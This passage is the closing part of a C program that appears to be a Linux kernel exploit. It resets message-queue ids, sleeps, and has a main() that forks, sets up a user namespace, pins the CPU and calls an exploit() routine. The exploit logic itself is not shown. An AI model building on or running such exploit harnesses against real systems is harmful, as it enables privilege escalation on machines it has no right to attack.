        qid[i] = -1;
    }

    sleep(13371337);
    return 0;
}

int main(int argc, char *argv[])
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    srand(time(NULL));

    if (!fork())
    {
        unshare_setup(getuid(), getgid());
        set_cpu_affinity(0, 0);
        exploit(argc, argv);
    }

    while (1)
        sleep(1);
    return 0;
}